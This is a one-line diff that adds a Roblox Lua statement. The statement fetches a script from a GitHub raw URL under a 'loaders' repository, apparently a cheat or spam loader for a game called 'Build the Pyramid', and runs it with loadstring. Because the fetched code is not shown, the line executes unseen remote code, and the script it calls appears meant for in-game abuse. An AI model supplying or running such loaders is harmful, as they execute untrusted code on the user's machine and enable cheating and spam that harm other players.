@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/build-the-pyramid-spam6-ub8e4nm6f0a6h1.lua"))()
